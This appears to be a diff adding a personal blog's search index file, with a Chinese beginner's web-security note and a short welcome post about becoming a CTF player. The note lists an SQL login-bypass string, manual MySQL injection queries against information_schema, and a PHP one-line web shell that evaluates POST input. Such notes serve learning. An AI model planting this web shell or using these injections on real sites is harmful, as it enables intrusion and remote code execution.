@@ -1,0 +1,23 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title><![CDATA[菜鸟初学web]]></title>
+    <url>%2F2018%2F10%2F19%2F%E8%8F%9C%E9%B8%9F%E5%88%9D%E5%AD%A6web%2F</url>
+    <content type="text"><![CDATA[密码绕过漏洞:11' or 1=1 '1 mysql手工注入:123select table_name from information_schema.tables where table_schema="";select column_name from information_schema.columns where table_name=""; php一句话木马:123&lt;?php @eval($_POST[ 'pass' ]);?&gt;"?&gt;&lt;?php @eval($_POST[ 'pass' ]);?&gt;&lt;?php#]]></content>
+      <categories>
+        <category>web安全学习笔记</category>
+      </categories>
+      <tags>
+        <tag>web安全</tag>
+        <tag>sql漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Welcome to my blog.]]></title>
+    <url>%2F2018%2F10%2F18%2FMy%20first%20blog%2F</url>
+    <content type="text"><![CDATA[学校里全是dalao，加油鸭！一定要成为一名牛逼的CTFer！不负自己，未来可期！]]></content>
+      <categories>
+        <category>随笔</category>
+      </categories>
+  </entry>
+</search>
